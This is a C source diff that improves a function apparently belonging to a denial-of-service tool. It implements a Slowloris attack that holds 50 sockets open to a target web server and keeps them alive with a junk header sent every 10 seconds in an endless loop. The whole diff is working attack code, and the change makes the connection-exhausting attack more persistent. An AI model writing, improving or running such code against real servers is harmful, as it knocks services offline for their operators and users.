@@ -564,10 +564,23 @@ inline static void __slow_stress() {
    show("[WEB STRESS] Making SlowLoris HTTP Requests to host [%s] on port %d...\n",
    pkt->dst, pkt->port);
 
-   int socks[50], i;
+   struct __socks socks[50];
+   int i;
+   for (i=0; i< 50; i++) socks[i].up = false;;
 
    __WEB:
       for (i = 0; i < 50; i++) {
+
+         if (socks[i].up) {
+            goto __SEND_DATA;
+         }
+
+         if ( (socks[i].sock = socket(AF_INET, SOCK_STREAM, 0)) == -1 ) {
+            break;
+         }
+         socks[i].up = true;
+         setsockopt (socks[i].sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&_times, sizeof(_times));
+         setsockopt (socks[i].sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&_times, sizeof(_times));
 
          if ( (i % 2) == 0 ) {
             snprintf(data, sizeof(__http) - 1,
@@ -585,18 +598,28 @@ inline static void __slow_stress() {
 
          size = strlen(data);
 
-         close(socks[i]);
-         if ( (socks[i] = socket(AF_INET, SOCK_STREAM, 0)) == -1 ) {
-            log("ERROR on socket create.\n");
+         __set_keepalive(socks[i].sock);
+         if ( connect(socks[i].sock, (struct sockaddr *) targ, tsize) == -1 ) {
+            socks[i].up = false;
+            break;
+         }
+         if ( send(socks[i].sock, data, size, 0) == -1) {
+            close(socks[i].sock);
+            socks[i].up = false;
             break;
          }
 
-         __set_keepalive(socks[i]);
-         connect(socks[i], (struct sockaddr *) targ, tsize);
-         send(socks[i], data, size, 0);
+__SEND_DATA:
+         snprintf(data, sizeof(__http) - 1, "Nsoq: \r\n");
+         size = strlen(data);
+         if ( send(socks[i].sock, data, size, 0) == -1 ) {
+            close(socks[i].sock);
+            socks[i].up = false;
+            break;
+         }
       }
 
-      usleep(10000000);
+      sleep(10);
    goto __WEB;
 
    pthread_exit(NULL);
